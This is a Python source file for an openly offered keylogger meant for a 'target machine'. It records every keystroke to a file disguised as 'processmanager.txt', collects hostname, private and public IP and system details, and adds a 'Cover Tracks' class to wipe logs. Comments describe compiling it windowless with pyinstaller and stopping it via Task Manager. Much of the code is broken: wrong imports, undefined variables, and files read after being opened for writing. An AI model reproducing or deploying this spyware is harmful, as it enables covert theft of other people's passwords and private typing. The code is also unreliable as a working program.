import os, time, socket, platform
from requests import get
from pynput.keyboard import Listener
from cryptography import Fernet

# Needs to be downloaded on target machine. This also means python must be installed/accessible on target machine.
# Download from terminal using pyinstaller KeyLogger.py --onefile --noconsole
# This will compile the program
# Can delete __pycache__ , build, and KeyLogger.spec immediately
# Only interested in dist directory
# To exit, go to task manager, end KeyLogger task
# Can put as many files as u want into the *args fxns, but for this basic example there's just one file
# system_information fxn idea from king04aman on GitHub

##---------------- File Encryption ----------------##
class FernetMachine:
    def __init__(self):
        self.key = None
        
    def key_gen(self):
        self.key = Fernet.generate_key()
        with open('encryption_key.txt', 'wb') as f: # 'wb' specifies opening file in binary writing mode; this makes sure u have a consistent key; paste in rather than generating new key if program is rerunning
            f.write(str(self.key))
            
    def encrypt(self, *args):
        key = self.key
        files_to_encrypt = [txt_file for file in args]
        count = 0
        
        for files in files_to_encrypt:
            with open(files_to_encrypt[count], 'wb') as f:
                data_to_encrypt = f.read()
                fernet = Fernet(self.key)
                encrypted_data = fernet.encrypt(data_to_encrypt)
                f.write(encrypted_data)
                f.close()
                
    def decrypt(self, *args):
        key = self.key # Paste key generated by KeyGen() fxn

        encrypted_files = [txt_file for arg in args]
        count = 0
    
        for files in encrypted_files:
            with open(encrypted_files[count], 'a+') as enc_f:
                data = enc_f.read()
                fernet = Fernet(self.key)
                decrypted_data = fernet.decrypt(data)
                enc_f.write(decrypted_data)
                count += 1

## ---------------- KeyLogger ---------------- ##            

#path = os.environ['appdata'] + '\\processmanager.txt' # For windows machine
# extend & file_merge allows for more files with other types of info the KeyLogger has grabbed to be stored w/ processmanager.txt
log_path = '' #Folder to house .txts
key_log = 'processmanager.txt' # File to write keystrokes to- needs to be hidden
sys_info = 'SysInfo.txt' # File to write system info to
extend = "\\"
file_merge = log_path + extend         
            
time_iteration = 15
number_of_iterations_end = 5            
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Get target machine system information
def get_system_info():
    with open(file_merge + sys_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address \n")

        f.write("Processor Info: " + (platform.processor()) + '\n')
        f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')
        
        f.close()

# Timer for KeyLogger
while number_of_iterations < number_of_iterations_end:
    keys = []
    count = 0
        
    def write_to_file(keys):
        with open(log_path + key_log, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)
                
    def on_press(key):
        global keys, count
        keys.append(key)
        count += 1
    
        if count >= 1:
            count = 0
            write_to_file(keys)
            keys = [] #Empty keys list right after we write to file so that we don't repeat previous keylogs
        
    with Listener(on_press=on_press) as listener:
        listener.join()

##---------------- Cover Tracks ----------------##
# KeyLogger 'cleanup crew' fxn to delete files-> need to extract files before running
class CleanupCrew:
    def __init__(self, *mess):
        self.mess = mess
        
    def empty_logs(self):
        if currentTime > stoppingTime:
            with open(file_merge + key_log, 'w') as f:
                f.write(' ')
                f.close()
            with open(file_merge, sys_info, 'w') as f:
                f.write(' ')
                f.close()
                              
    def erase_files(self):
        files_to_delete = [file for arg in self.mess]
        for file in files_to_delete:
            os.remove(file_merge + file)